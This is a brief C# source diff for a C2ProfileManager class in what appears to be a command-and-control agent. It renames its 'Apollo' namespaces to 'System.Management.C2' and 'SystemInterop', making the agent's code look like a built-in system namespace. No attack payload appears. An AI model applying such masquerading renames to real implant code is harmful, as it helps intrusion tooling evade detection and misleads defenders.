@@ -1,11 +1,11 @@
-﻿using ApolloInterop.Interfaces;
+﻿using SystemInterop.Interfaces;
 using HttpTransport;
 using System;
 using System.Collections.Generic;
 
-namespace Apollo.Management.C2
+namespace System.Management.C2
 {
-    public class C2ProfileManager : ApolloInterop.Classes.C2ProfileManager
+    public class C2ProfileManager : SystemInterop.Classes.C2ProfileManager
     {
         public C2ProfileManager(IAgent agent) : base(agent)
         {
